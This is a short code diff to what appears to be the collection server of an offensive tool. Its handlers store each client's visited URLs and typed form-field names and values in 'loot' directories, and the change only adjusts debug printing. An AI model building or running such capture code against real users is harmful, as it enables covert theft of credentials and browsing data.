@@ -61,6 +61,7 @@ logFileName = "sessionLog.txt"
 
 
 def logEvent(identifier, logString):
+    print("++ Start logEvent")
     lootPath = './loot/client_' + str(SessionDirectories[identifier])
 
     # We're going to append to the logfile
@@ -68,7 +69,7 @@ def logEvent(identifier, logString):
     #print("In logEvent with time: " + str(time.localtime(time.time())))
     sessionFile.write(str(time.time()) + ": " + logString + "\n")
     sessionFile.close()
-
+    print("-- End logEvent")
 
 # Need function to check session, return download directory
 def findLootDirectory(identifier):
@@ -202,7 +203,7 @@ def recordUrl(identifier):
     lootDir = findLootDirectory(identifier)
     content = request.json
     url = content['url']
-    print("Got URL: " + url)
+    # print("Got URL: " + url)
     logEvent(identifier, "URL Visited: " + url)
 
     return "ok", 200
@@ -218,7 +219,7 @@ def recordInput(identifier):
     content = request.json
     inputName = content['inputName']
     inputValue = content['inputValue']
-    print("Got input: " + inputName + ", value: " + inputValue)
+    # print("Got input: " + inputName + ", value: " + inputValue)
     logEvent(identifier, "User input field: " + inputName + ", value: " + inputValue)
 
     return "ok", 200
